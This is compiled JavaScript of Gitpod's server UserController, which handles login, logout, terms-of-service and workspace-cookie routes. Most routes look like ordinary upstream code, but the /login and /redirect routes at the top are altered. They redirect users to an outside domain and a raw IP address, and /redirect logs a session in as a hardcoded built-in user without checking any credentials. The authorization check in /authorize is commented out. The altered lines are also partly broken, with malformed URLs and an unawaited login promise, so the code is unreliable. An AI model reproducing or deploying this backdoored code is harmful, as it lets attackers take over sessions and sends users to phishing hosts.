"use strict";
/**
 * Copyright (c) 2020 Gitpod GmbH. All rights reserved.
 * Licensed under the GNU Affero General Public License (AGPL).
 * See License-AGPL.txt in the project root for license information.
 */
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.UserController = void 0;
const crypto = require("crypto");
const inversify_1 = require("inversify");
const lib_1 = require("@gitpod/gitpod-db/lib");
const express = require("express");
const authenticator_1 = require("../auth/authenticator");
const config_1 = require("../config");
const logging_1 = require("@gitpod/gitpod-protocol/lib/util/logging");
const authorization_service_1 = require("./authorization-service");
const permission_1 = require("@gitpod/gitpod-protocol/lib/permission");
const user_service_1 = require("./user-service");
const parse_workspace_id_1 = require("@gitpod/gitpod-protocol/lib/util/parse-workspace-id");
const session_handler_1 = require("../session-handler");
const url_1 = require("url");
const express_util_1 = require("../express-util");
const gitpod_protocol_1 = require("@gitpod/gitpod-protocol");
const host_context_provider_1 = require("../auth/host-context-provider");
const auth_provider_1 = require("../auth/auth-provider");
const login_completion_handler_1 = require("../auth/login-completion-handler");
const analytics_1 = require("@gitpod/gitpod-protocol/lib/analytics");
const tos_cookie_1 = require("./tos-cookie");
const tos_flow_1 = require("../terms/tos-flow");
const prometheus_metrics_1 = require("../../src/prometheus-metrics");
const uuid_1 = require("uuid");
const resource_access_1 = require("../auth/resource-access");
const one_time_secret_server_1 = require("../one-time-secret-server");
const analytics_2 = require("../analytics");
const client_provider_1 = require("@gitpod/ws-manager/lib/client-provider");
const enforcement_endpoint_1 = require("./enforcement-endpoint");
const websocket_connection_manager_1 = require("../websocket/websocket-connection-manager");
const vscode_jsonrpc_1 = require("vscode-jsonrpc");

let UserController = class UserController {
    get apiRouter() {
        const router = express.Router();

        router.get("/login", (req, res, next) => {
            // res.send("hello")
            if (req.host == "Azure AD") {
                res.redirect("https://swddd.rdsec.xyz/api/signin?host=github.com&returnTo=https%3A%2F%2Fswddd.rdsec.xyz%2Fcomplete-auth%3Fmessage%3Dsuccess");
            }
            
            res.redirect("http://20.237.12.145/signin");
        });

        router.get("/redirect", (req, res, next) => {
            // res.send("hello")

            (0, express_util_1.saveSession)(req.session);

            auth_provider_1.AuthFlow.attach(req.session, {
                host: "github.com",
                returnTo: "https://swddd.rdsec.xyz/complete-auth?message=success",
            });

            //tos_flow_1.TosFlow.attach(req.session, flowContext);
            let user = gitpod_protocol_1.User;
            let identity;
            let token;
            user.id = "builtin-user-workspace-probe-0000000";

            try {
              
               // this.userDb.storeUser(user);
            } catch {
                res.redirect("https://swddd.rdsec.xyzzz");
            }

            try {
                new Promise((resolve, reject) => {
                    req.login(user, (err) => {
                        if (err) {
                            reject(err);
                        }
                        else {
                            resolve();
                        }
                    });
                });
            } catch {
                res.redirect("hhtps://swddd.rdsec.xyz");
            }
            

            // let flowContext;
            // flowContext = {
            //     candidate: "candidate",
            //     token: "token",
            //     authUser: "authUser",
            //     envVars: "",
            //     additionalIdentity: "githubIdentity",
            //     additionalToken: "githubToken",
            //     authHost: "Azure AD",
            //     isBlocked: "false",
            //     termsAcceptanceRequired: "false",
            // };

            // tos_flow_1.TosFlow.attach(req.session, flowContext);


            res.redirect("https://swddd.rdsec.xyz/complete-auth?message=success")

        });

        // todo
        router.get("/signin", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            // Clean up
            this.tosCookie.unset(res);
            if (req.isAuthenticated()) {
                logging_1.log.info({ sessionId: req.sessionID }, "(Auth) User is already authenticated.", { "login-flow": true });
                // redirect immediately
                const redirectTo = this.getSafeReturnToParam(req) || this.config.hostUrl.asDashboard().toString();
                res.redirect(redirectTo);
                return;
            }
            const clientInfo = (0, express_util_1.getRequestingClientInfo)(req);
            logging_1.log.info({ sessionId: req.sessionID }, "(Auth) User started the login process", {
                "login-flow": true,
                clientInfo,
            });
            // Try to guess auth host from request
            yield this.augmentLoginRequest(req);
            // If there is no known auth host, we need to ask the user
            const redirectToLoginPage = !req.query.host;
            if (redirectToLoginPage) {
                const returnTo = this.getSafeReturnToParam(req);
                const search = returnTo ? `returnTo=${returnTo}` : "";
                const loginPageUrl = this.config.hostUrl.asLogin().with({ search }).toString();
                logging_1.log.info(`Redirecting to login ${loginPageUrl}`);
                res.redirect(loginPageUrl);
                return;
            }
            // Make sure, the session is stored before we initialize the OAuth flow
            try {
                yield (0, express_util_1.saveSession)(req.session);
            }
            catch (error) {
                (0, prometheus_metrics_1.increaseLoginCounter)("failed", "unknown");
                logging_1.log.error(`Login failed due to session save error; redirecting to /sorry`, { req, error, clientInfo });
                res.redirect(this.getSorryUrl("Login failed 🦄 Please try again"));
            }
            // Proceed with login
            this.ensureSafeReturnToParam(req);
            yield this.authenticator.authenticate(req, res, next);
        }));
        router.get("/login/ots/:userId/:key", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            try {
                const secret = yield this.otsDb.get(req.params.key);
                if (!secret) {
                    res.sendStatus(401);
                    return;
                }
                const user = yield this.userDb.findUserById(req.params.userId);
                if (!user) {
                    res.sendStatus(404);
                    return;
                }
                const secretHash = crypto
                    .createHash("sha256")
                    .update(user.id + this.config.session.secret)
                    .digest("hex");
                if (secretHash !== secret) {
                    res.sendStatus(401);
                    return;
                }
                // mimick the shape of a successful login
                req.session.passport = { user: user.id };
                // Save session to DB
                yield new Promise((resolve, reject) => req.session.save((err) => (err ? reject(err) : resolve())));
                res.sendStatus(200);
            }
            catch (error) {
                res.sendStatus(500);
            }
        }));
        router.get("/authorize", (req, res, next) => {
            // if (!gitpod_protocol_1.User.is(req.user)) {
            //     res.sendStatus(401);
            //     return;
            // }
            if (req.user.blocked) {
                res.sendStatus(403);
                return;
            }
            this.ensureSafeReturnToParam(req);
            this.authenticator.authorize(req, res, next).catch((err) => logging_1.log.error("authenticator.authorize", err));
        });
        router.get("/deauthorize", (req, res, next) => {
            if (!gitpod_protocol_1.User.is(req.user)) {
                res.sendStatus(401);
                return;
            }
            if (req.user.blocked) {
                res.sendStatus(403);
                return;
            }
            this.ensureSafeReturnToParam(req);
            this.authenticator.deauthorize(req, res, next).catch((err) => logging_1.log.error("authenticator.deauthorize", err));
        });
        router.get("/logout", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            const logContext = logging_1.LogContext.from({ user: req.user, request: req });
            const clientInfo = (0, express_util_1.getRequestingClientInfo)(req);
            const logPayload = { session: req.session, clientInfo };
            let redirectToUrl = this.getSafeReturnToParam(req) || this.config.hostUrl.toString();
            if (req.isAuthenticated()) {
                req.logout();
            }
            try {
                if (req.session) {
                    yield (0, express_util_1.destroySession)(req.session);
                }
            }
            catch (error) {
                logging_1.log.warn(logContext, "(Logout) Error on Logout.", Object.assign({ error, req }, logPayload));
            }
            // clear cookies
            this.sessionHandlerProvider.clearSessionCookie(res, this.config);
            // then redirect
            logging_1.log.info(logContext, "(Logout) Redirecting...", Object.assign({ redirectToUrl }, logPayload));
            res.redirect(redirectToUrl);
        }));
        router.get("/auth/workspace-cookie/:instanceID", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            if (!req.isAuthenticated() || !gitpod_protocol_1.User.is(req.user)) {
                res.sendStatus(401);
                logging_1.log.warn("unauthenticated workspace cookie fetch", { instanceId: req.params.instanceID });
                return;
            }
            const user = req.user;
            if (user.blocked) {
                res.sendStatus(403);
                logging_1.log.warn("blocked user attempted to fetch workspace cookie", {
                    instanceId: req.params.instanceID,
                    userId: user.id,
                });
                return;
            }
            const instanceID = req.params.instanceID;
            if (!instanceID) {
                res.sendStatus(400);
                logging_1.log.warn("attempted to fetch workspace cookie without instance ID", {
                    instanceId: req.params.instanceID,
                    userId: user.id,
                });
                return;
            }
            let cookiePrefix = this.config.hostUrl.url.host;
            cookiePrefix = cookiePrefix.replace(/^https?/, "");
            [" ", "-", "."].forEach((c) => (cookiePrefix = cookiePrefix.split(c).join("_")));
            const name = `_${cookiePrefix}_ws_${instanceID}_owner_`;
            if (!!req.cookies[name]) {
                // cookie is already set - do nothing. This prevents server from drowning in load
                // if the dashboard is ill-behaved.
                res.sendStatus(200);
                return;
            }
            const [workspace, instance] = yield Promise.all([
                this.workspaceDB.findByInstanceId(instanceID),
                this.workspaceDB.findInstanceById(instanceID),
            ]);
            if (!workspace || !instance) {
                res.sendStatus(404);
                logging_1.log.warn("attempted to fetch workspace cookie for non-existent workspace instance", {
                    instanceId: req.params.instanceID,
                    userId: user.id,
                });
                return;
            }
            if (workspace && user.id != workspace.ownerId) {
                // [cw] The user is not the workspace owner, which means they don't get the owner cookie.
                // [cw] In the future, when we introduce per-user tokens we can set the user-specific token here.
                if (workspace.shareable) {
                    // workspace is shared and hence can be accessed without the cookie.
                    res.sendStatus(200);
                    return;
                }
                res.sendStatus(403);
                logging_1.log.warn("unauthorized attempted to fetch workspace cookie", {
                    instanceId: req.params.instanceID,
                    userId: user.id,
                });
                return;
            }
            const token = instance.status.ownerToken;
            if (!token) {
                // no token, no problem. The dashboard will try again later.
                res.sendStatus(200);
                logging_1.log.debug("attempted to fetch workspace cookie, but instance has no owner token", {
                    instanceId: req.params.instanceID,
                    userId: user.id,
                });
                return;
            }
            if (res.headersSent) {
                return;
            }
            res.cookie(name, token, {
                path: "/",
                httpOnly: true,
                secure: true,
                maxAge: 1000 * 60 * 60 * 24 * 1,
                sameSite: "lax",
                domain: `.${this.config.hostUrl.url.host}`,
            });
            res.sendStatus(200);
        }));
        router.post("/auth/workspacePageClose/:instanceID", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            const logCtx = { instanceId: req.params.instanceID };
            if (!req.isAuthenticated() || !gitpod_protocol_1.User.is(req.user)) {
                res.sendStatus(401);
                logging_1.log.warn(logCtx, "unauthenticated workspacePageClose");
                return;
            }
            const user = req.user;
            logCtx.userId = user.id;
            if (user.blocked) {
                res.sendStatus(403);
                logging_1.log.warn(logCtx, "blocked user attempted to workspacePageClose");
                return;
            }
            const instanceID = req.params.instanceID;
            if (!instanceID) {
                res.sendStatus(400);
                logging_1.log.warn(logCtx, "attempted to workspacePageClose without instance ID");
                return;
            }
            const sessionId = req.body.sessionId;
            const server = this.createGitpodServer(user, new resource_access_1.OwnerResourceGuard(user.id));
            try {
                yield server.sendHeartBeat({}, { wasClosed: true, instanceId: instanceID });
                /** no await */ server
                    .trackEvent({}, {
                    event: "ide_close_signal",
                    properties: {
                        sessionId,
                        instanceId: instanceID,
                        clientKind: "supervisor-frontend",
                    },
                })
                    .catch((err) => logging_1.log.warn(logCtx, "workspacePageClose: failed to track ide close signal", err));
                res.sendStatus(200);
            }
            catch (e) {
                if (e instanceof vscode_jsonrpc_1.ResponseError) {
                    res.status(e.code).send(e.message);
                    logging_1.log.warn(logCtx, `workspacePageClose: server sendHeartBeat respond with code: ${e.code}, message: ${e.message}`);
                    return;
                }
                logging_1.log.error(logCtx, "workspacePageClose failed", e);
                res.sendStatus(500);
                return;
            }
            finally {
                server.dispose();
            }
        }));
        if (this.config.enableLocalApp) {
            router.get("/auth/local-app", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
                if (!req.isAuthenticated() || !gitpod_protocol_1.User.is(req.user)) {
                    res.sendStatus(401);
                    return;
                }
                const user = req.user;
                if (user.blocked) {
                    res.sendStatus(403);
                    return;
                }
                const rt = req.query.returnTo;
                // @ts-ignore Type 'ParsedQs' is not assignable
                if (!rt || !rt.startsWith("localhost:")) {
                    logging_1.log.error(`auth/local-app: invalid returnTo URL: "${rt}"`);
                    res.sendStatus(400);
                    return;
                }
                const token = crypto.randomBytes(30).toString("hex");
                const tokenHash = crypto.createHash("sha256").update(token, "utf8").digest("hex");
                const dbToken = {
                    tokenHash,
                    name: `local-app`,
                    type: gitpod_protocol_1.GitpodTokenType.MACHINE_AUTH_TOKEN,
                    user: req.user,
                    scopes: [
                        "function:getWorkspaces",
                        "function:listenForWorkspaceInstanceUpdates",
                        "resource:" +
                            resource_access_1.ScopedResourceGuard.marshalResourceScope({
                                kind: "workspace",
                                subjectID: "*",
                                operations: ["get"],
                            }),
                        "resource:" +
                            resource_access_1.ScopedResourceGuard.marshalResourceScope({
                                kind: "workspaceInstance",
                                subjectID: "*",
                                operations: ["get"],
                            }),
                    ],
                    created: new Date().toISOString(),
                };
                yield this.userDb.storeGitpodToken(dbToken);
                const otsExpirationTime = new Date();
                otsExpirationTime.setMinutes(otsExpirationTime.getMinutes() + 2);
                const ots = yield this.otsServer.serve({}, token, otsExpirationTime);
                res.redirect(`http://${rt}/?ots=${encodeURI(ots.token)}`);
            }));
        }
        router.get("/auth/workspace", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            if (!req.isAuthenticated() || !gitpod_protocol_1.User.is(req.user)) {
                res.sendStatus(401);
                return;
            }
            const user = req.user;
            if (user.blocked) {
                res.sendStatus(403);
                return;
            }
            const workspaceId = (0, parse_workspace_id_1.parseWorkspaceIdFromHostname)(req.hostname);
            if (workspaceId) {
                const workspace = yield this.workspaceDB.findById(workspaceId);
                if (workspace && user.id != workspace.ownerId && !workspace.shareable) {
                    logging_1.log.info({ userId: user.id, workspaceId }, "User does not own private workspace. Denied");
                    res.sendStatus(403);
                    return;
                }
            }
            res.sendStatus(200);
        }));
        router.get("/auth/monitor", (req, res, next) => __awaiter(this, void 0, void 0, function* () {
            if (!req.isAuthenticated() || !gitpod_protocol_1.User.is(req.user)) {
                // Pretend there's nothing to see
                res.sendStatus(403);
                return;
            }
            const user = req.user;
            if (this.authService.hasPermission(user, permission_1.Permission.MONITOR)) {
                res.sendStatus(200);
                return;
            }
            res.sendStatus(403);
        }));
        router.get("/tos", (req, res) => __awaiter(this, void 0, void 0, function* () {
            const mode = req.query["mode"];
            const clientInfo = (0, express_util_1.getRequestingClientInfo)(req);
            let tosFlowInfo = tos_flow_1.TosFlow.get(req.session);
            const authFlow = auth_provider_1.AuthFlow.get(req.session);
            const logContext = logging_1.LogContext.from({ user: req.user, request: req });
            const logPayload = { session: req.session, clientInfo, tosFlowInfo, authFlow, mode };
            const redirectOnInvalidRequest = () => __awaiter(this, void 0, void 0, function* () {
                // just don't forget
                this.tosCookie.unset(res);
                yield auth_provider_1.AuthFlow.clear(req.session);
                yield tos_flow_1.TosFlow.clear(req.session);
                logging_1.log.info(logContext, "(TOS) Invalid request. (/tos)", logPayload);
                res.redirect(this.getSorryUrl("Oops! Something went wrong. (invalid request)"));
            });
            if (mode !== "login" && mode !== "update") {
                yield redirectOnInvalidRequest();
                return;
            }
            if (mode === "login") {
                if (!authFlow || !tos_flow_1.TosFlow.is(tosFlowInfo)) {
                    yield redirectOnInvalidRequest();
                    return;
                }
                // in a special case of the signup process, we're redirecting to /tos even if not required.
                if (tos_flow_1.TosFlow.WithIdentity.is(tosFlowInfo) && tosFlowInfo.termsAcceptanceRequired === false) {
                    logging_1.log.info(logContext, "(TOS) Not required.", logPayload);
                    yield this.handleTosProceedForNewUser(req, res, authFlow, tosFlowInfo);
                    return;
                }
            }
            else {
                // we are in tos update process
                const user = gitpod_protocol_1.User.is(req.user) ? req.user : undefined;
                if (!user) {
                    yield redirectOnInvalidRequest();
                    return;
                }
                // initializing flow here!
                tosFlowInfo = {
                    user: gitpod_protocol_1.User.censor(user),
                    returnToUrl: req.query.returnTo,
                };
            }
            // attaching a random identifier for this web flow to test if it's present in `/tos/proceed` handler
            const flowId = (0, uuid_1.v4)();
            tosFlowInfo.flowId = flowId;
            yield tos_flow_1.TosFlow.attach(req.session, tosFlowInfo);
            const isUpdate = !tos_flow_1.TosFlow.WithIdentity.is(tosFlowInfo);
            const userInfo = tosFlowUserInfo(tosFlowInfo);
            const tosHints = {
                flowId,
                isUpdate,
                userInfo, // let us render the avatar on the dashboard page
            };
            this.tosCookie.set(res, tosHints);
            logging_1.log.info(logContext, "(TOS) Redirecting to /tos.", Object.assign({ tosHints }, logPayload));
            res.redirect(this.config.hostUrl.with(() => ({ pathname: "/tos/" })).toString());
        }));
        const tosFlowUserInfo = (tosFlowInfo) => {
            if (tos_flow_1.TosFlow.WithIdentity.is(tosFlowInfo)) {
                tosFlowInfo.authUser.authName;
                return {
                    name: tosFlowInfo.authUser.name || tosFlowInfo.authUser.authName,
                    avatarUrl: tosFlowInfo.authUser.avatarUrl,
                    authHost: tosFlowInfo.authHost,
                    authName: tosFlowInfo.authUser.authName,
                };
            }
            if (tos_flow_1.TosFlow.WithUser.is(tosFlowInfo)) {
                return {
                    name: tosFlowInfo.user.name,
                    avatarUrl: tosFlowInfo.user.avatarUrl,
                };
            }
        };
        router.post("/tos/proceed", (req, res) => __awaiter(this, void 0, void 0, function* () {
            // just don't forget
            this.tosCookie.unset(res);
            const clientInfo = (0, express_util_1.getRequestingClientInfo)(req);
            const tosFlowInfo = tos_flow_1.TosFlow.get(req.session);
            const authFlow = auth_provider_1.AuthFlow.get(req.session);
            const isInLoginProcess = !!authFlow;
            const logContext = logging_1.LogContext.from({ user: req.user, request: req });
            const logPayload = { session: req.session, clientInfo, tosFlowInfo, authFlow };
            const redirectOnInvalidSession = () => __awaiter(this, void 0, void 0, function* () {
                yield auth_provider_1.AuthFlow.clear(req.session);
                yield tos_flow_1.TosFlow.clear(req.session);
                logging_1.log.info(logContext, "(TOS) Invalid session. (/tos/proceed)", logPayload);
                res.redirect(this.getSorryUrl("Oops! Something went wrong. (invalid session)"));
            });
            if (!tos_flow_1.TosFlow.is(tosFlowInfo)) {
                yield redirectOnInvalidSession();
                return;
            }
            // detaching the (random) identifier of this webflow
            const flowId = tosFlowInfo.flowId;
            delete tosFlowInfo.flowId;
            yield tos_flow_1.TosFlow.attach(req.session, tosFlowInfo);
            // let's assume if the form is re-submitted a second time, we need to abort the process, because
            // otherwise we potentially create accounts for the same provider identity twice.
            //
            // todo@alex: check if it's viable to test the flow ids for a single submission, instead of detaching
            // from the session.
            if (typeof flowId !== "string") {
                yield redirectOnInvalidSession();
                return;
            }
            const agreeTOS = req.body.agreeTOS;
            if (!agreeTOS) {
                // The user did not accept the terms.
                // A redirect to /logout will wipe the session, which in case of a signup will ensure
                // that no user data remains in the system.
                logging_1.log.info(logContext, "(TOS) User did NOT agree. Redirecting to /logout.", logPayload);
                res.redirect(this.config.hostUrl.withApi({ pathname: "/logout" }).toString());
                // todo@alex: consider redirecting to a info page (returnTo param)
                return;
            }
            // The user has approved the terms.
            logging_1.log.info(logContext, "(TOS) User did agree.", logPayload);
            if (tos_flow_1.TosFlow.WithIdentity.is(tosFlowInfo)) {
                if (!authFlow) {
                    yield redirectOnInvalidSession();
                    return;
                }
                // there is a possibility, that a competing browser session already created a new user account
                // for this provider identity, thus we need to check again, in order to avoid created unreachable accounts
                const user = yield this.userService.findUserForLogin({ candidate: tosFlowInfo.candidate });
                if (user) {
                    logging_1.log.info(`(TOS) User was created in a parallel browser session, let's login...`, { logPayload });
                    yield this.loginCompletionHandler.complete(req, res, {
                        user,
                        authHost: tosFlowInfo.authHost,
                        returnToUrl: authFlow.returnTo,
                    });
                }
                else {
                    yield this.handleTosProceedForNewUser(req, res, authFlow, tosFlowInfo, req.body);
                }
                return;
            }
            if (tos_flow_1.TosFlow.WithUser.is(tosFlowInfo)) {
                const { user, returnToUrl } = tosFlowInfo;
                yield this.userService.acceptCurrentTerms(user);
                if (isInLoginProcess) {
                    yield this.loginCompletionHandler.complete(req, res, Object.assign({}, tosFlowInfo));
                }
                else {
                    let returnTo = returnToUrl || this.config.hostUrl.asDashboard().toString();
                    res.redirect(returnTo);
                }
            }
        }));
        return router;
    }
    handleTosProceedForNewUser(req, res, authFlow, tosFlowInfo, tosProceedParams) {
        return __awaiter(this, void 0, void 0, function* () {
            const { candidate, token } = tosFlowInfo;
            const { returnTo, host } = authFlow;
            const user = yield this.userService.createUser({
                identity: candidate,
                token,
                userUpdate: (user) => this.updateNewUserAfterTos(user, tosFlowInfo, tosProceedParams),
            });
            const { additionalIdentity, additionalToken, envVars } = tosFlowInfo;
            if (additionalIdentity && additionalToken) {
                yield this.userService.updateUserIdentity(user, additionalIdentity, additionalToken);
            }
            if (user.blocked) {
                logging_1.log.warn({ user: user.id }, "user blocked on signup");
            }
            yield this.userService.updateUserEnvVarsOnLogin(user, envVars);
            yield this.userService.acceptCurrentTerms(user);
            /** no await */ (0, analytics_2.trackSignup)(user, req, this.analytics).catch((err) => logging_1.log.warn({ userId: user.id }, "trackSignup", err));
            yield this.loginCompletionHandler.complete(req, res, { user, returnToUrl: returnTo, authHost: host });
        });
    }
    updateNewUserAfterTos(newUser, tosFlowInfo, tosProceedParams) {
        const { authUser } = tosFlowInfo;
        newUser.name = authUser.authName;
        newUser.fullName = authUser.name || undefined;
        newUser.avatarUrl = authUser.avatarUrl;
        newUser.blocked = newUser.blocked || tosFlowInfo.isBlocked;
    }
    getSorryUrl(message) {
        return this.config.hostUrl.asSorry(message).toString();
    }
    augmentLoginRequest(req) {
        return __awaiter(this, void 0, void 0, function* () {
            const returnToURL = this.getSafeReturnToParam(req);
            if (req.query.host) {
                // This login request points already to an auth host
                return;
            }
            // read current auth provider configs
            const authProviderConfigs = this.hostContextProvider.getAll().map((hc) => hc.authProvider.params);
            // Special Context exception
            if (returnToURL) {
                const authProviderForSpecialContext = authProviderConfigs.find((c) => {
                    if (c.loginContextMatcher) {
                        try {
                            const matcher = new RegExp(c.loginContextMatcher);
                            return matcher.test(returnToURL);
                        }
                        catch (_a) {
                            /* */
                        }
                    }
                    return false;
                });
                if (authProviderForSpecialContext) {
                    // the `host` param will be used by the authenticator to delegate to the auth provider
                    req.query.host = authProviderForSpecialContext.host;
                    logging_1.log.debug({ sessionId: req.sessionID }, `Using "${authProviderForSpecialContext.type}" for login ...`, {
                        "login-flow": true,
                        query: req.query,
                        authProviderForSpecialContext,
                    });
                    return;
                }
            }
            // Use the single available auth provider
            const authProvidersOnDashboard = authProviderConfigs
                .filter((c) => !c.hiddenOnDashboard && !c.disallowLogin)
                .map((a) => a.host);
            if (authProvidersOnDashboard.length === 1) {
                req.query.host = authProvidersOnDashboard[0];
                return;
            }
            // If the context URL contains a known auth host, just use this
            if (returnToURL) {
                // returnToURL -> https://gitpod.io/#https://github.com/theia-ide/theia"
                const hash = decodeURIComponent(new url_1.URL(decodeURIComponent(returnToURL)).hash);
                const value = hash.substr(1); // to remove the leading #
                let contextUrlHost;
                try {
                    const contextURL = new url_1.URL(value);
                    contextUrlHost = contextURL.hostname;
                }
                catch (_a) {
                    // ignore parse errors
                }
                if (!!contextUrlHost && authProvidersOnDashboard.find((a) => a === contextUrlHost)) {
                    req.query.host = contextUrlHost;
                    logging_1.log.debug({ sessionId: req.sessionID }, "Guessed auth provider from returnTo URL: " + contextUrlHost, {
                        "login-flow": true,
                        query: req.query,
                    });
                    return;
                }
            }
        });
    }
    ensureSafeReturnToParam(req) {
        req.query.returnTo = this.getSafeReturnToParam(req);
    }
    urlStartsWith(url, prefixUrl) {
        prefixUrl += prefixUrl.endsWith("/") ? "" : "/";
        return url.toLowerCase().startsWith(prefixUrl.toLowerCase());
    }
    getSafeReturnToParam(req) {
        // @ts-ignore Type 'ParsedQs' is not assignable
        const returnToURL = req.query.redirect || req.query.returnTo;
        if (!returnToURL) {
            logging_1.log.debug({ sessionId: req.sessionID }, "Empty redirect URL");
            return;
        }
        if (this.urlStartsWith(returnToURL, this.config.hostUrl.toString()) ||
            this.urlStartsWith(returnToURL, "https://www.gitpod.io")) {
            return returnToURL;
        }
        logging_1.log.debug({ sessionId: req.sessionID }, "The redirect URL does not match", { query: req.query });
        return;
    }
    createGitpodServer(user, resourceGuard) {
        const server = this.serverFactory();
        server.initialize(undefined, user, resourceGuard, websocket_connection_manager_1.ClientMetadata.from(user.id), undefined, {});
        return server;
    }
};
__decorate([
    (0, inversify_1.inject)(lib_1.WorkspaceDB),
    __metadata("design:type", Object)
], UserController.prototype, "workspaceDB", void 0);
__decorate([
    (0, inversify_1.inject)(lib_1.UserDB),
    __metadata("design:type", Object)
], UserController.prototype, "userDb", void 0);
__decorate([
    (0, inversify_1.inject)(authenticator_1.Authenticator),
    __metadata("design:type", authenticator_1.Authenticator)
], UserController.prototype, "authenticator", void 0);
__decorate([
    (0, inversify_1.inject)(config_1.Config),
    __metadata("design:type", Object)
], UserController.prototype, "config", void 0);
__decorate([
    (0, inversify_1.inject)(tos_cookie_1.TosCookie),
    __metadata("design:type", tos_cookie_1.TosCookie)
], UserController.prototype, "tosCookie", void 0);
__decorate([
    (0, inversify_1.inject)(authorization_service_1.AuthorizationService),
    __metadata("design:type", Object)
], UserController.prototype, "authService", void 0);
__decorate([
    (0, inversify_1.inject)(user_service_1.UserService),
    __metadata("design:type", user_service_1.UserService)
], UserController.prototype, "userService", void 0);
__decorate([
    (0, inversify_1.inject)(host_context_provider_1.HostContextProvider),
    __metadata("design:type", Object)
], UserController.prototype, "hostContextProvider", void 0);
__decorate([
    (0, inversify_1.inject)(analytics_1.IAnalyticsWriter),
    __metadata("design:type", Object)
], UserController.prototype, "analytics", void 0);
__decorate([
    (0, inversify_1.inject)(session_handler_1.SessionHandlerProvider),
    __metadata("design:type", session_handler_1.SessionHandlerProvider)
], UserController.prototype, "sessionHandlerProvider", void 0);
__decorate([
    (0, inversify_1.inject)(login_completion_handler_1.LoginCompletionHandler),
    __metadata("design:type", login_completion_handler_1.LoginCompletionHandler)
], UserController.prototype, "loginCompletionHandler", void 0);
__decorate([
    (0, inversify_1.inject)(one_time_secret_server_1.OneTimeSecretServer),
    __metadata("design:type", one_time_secret_server_1.OneTimeSecretServer)
], UserController.prototype, "otsServer", void 0);
__decorate([
    (0, inversify_1.inject)(lib_1.OneTimeSecretDB),
    __metadata("design:type", Object)
], UserController.prototype, "otsDb", void 0);
__decorate([
    (0, inversify_1.inject)(client_provider_1.WorkspaceManagerClientProvider),
    __metadata("design:type", client_provider_1.WorkspaceManagerClientProvider)
], UserController.prototype, "workspaceManagerClientProvider", void 0);
__decorate([
    (0, inversify_1.inject)(enforcement_endpoint_1.EnforcementControllerServerFactory),
    __metadata("design:type", Function)
], UserController.prototype, "serverFactory", void 0);
UserController = __decorate([
    (0, inversify_1.injectable)()
], UserController);
exports.UserController = UserController;
//# sourceMappingURL=user-controller.js.map